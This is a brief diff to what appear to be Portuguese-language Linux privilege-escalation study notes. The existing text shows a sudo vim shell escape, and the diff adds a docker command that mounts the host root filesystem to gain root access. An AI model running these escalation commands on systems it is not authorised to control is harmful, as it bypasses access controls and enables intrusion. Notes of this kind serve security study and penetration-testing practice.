@@ -4853,6 +4853,7 @@ Quando dado o comando sudo -l ele te mostra quais programas são iniciados com o
 
     sudo vim -c '!bash' 
 
+    docker run --rm -it -v "/:/mnt" bash
 
 - Linux PrivEsc: Permissões e Cron
 
